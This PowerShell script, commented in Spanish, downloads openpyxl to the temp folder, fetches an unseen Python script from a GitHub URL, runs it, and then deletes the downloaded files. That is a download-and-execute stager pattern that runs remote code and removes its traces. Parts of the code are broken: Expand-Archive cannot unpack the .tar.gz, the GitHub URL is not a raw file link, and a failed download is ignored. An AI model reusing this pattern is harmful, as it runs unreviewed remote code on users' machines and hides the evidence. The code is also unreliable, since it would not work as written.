# Descargar openpyxl manualmente
$openpyxlURL = 'https://files.pythonhosted.org/packages/0b/e6/b3bc232d3e2b37828d0f3faab3dbf32a2a169c1cfff75625139e792f6e33/openpyxl-3.0.9.tar.gz'
$openpyxlPath = "$env:TEMP\openpyxl.tar.gz"
Invoke-WebRequest -Uri $openpyxlURL -OutFile $openpyxlPath

# Descomprimir openpyxl
Expand-Archive -Path $openpyxlPath -DestinationPath "$env:TEMP\openpyxl"

# Ruta donde se guardará el script de Python
$pythonScriptPath = "$env:TEMP\script.py"

# URL de tu script de Python
$pythonScriptURL = 'https://github.com/astronomyc/filesRecents/main.py'

try {
    $response = Invoke-WebRequest -Uri $pythonScriptURL -UseBasicParsing
}
catch {
    # Manejar cualquier error que ocurra durante la descarga
    Write-Host "Ocurrió un error durante la ejecución del script."
}

# Guardar el contenido descargado en un archivo
Set-Content -Path $pythonScriptPath -Value $response.Content

# Añadir la ruta de openpyxl al PYTHONPATH
$env:PYTHONPATH = "$env:TEMP\openpyxl"

# Ejecutar el script de Python utilizando el intérprete de Python
python.exe $pythonScriptPath

# Limpiar los archivos descargados después de ejecutar el script
Remove-Item -Path $pythonScriptPath
Remove-Item -Path $openpyxlPath
Remove-Item -Path "$env:TEMP\openpyxl" -Recurse -Force
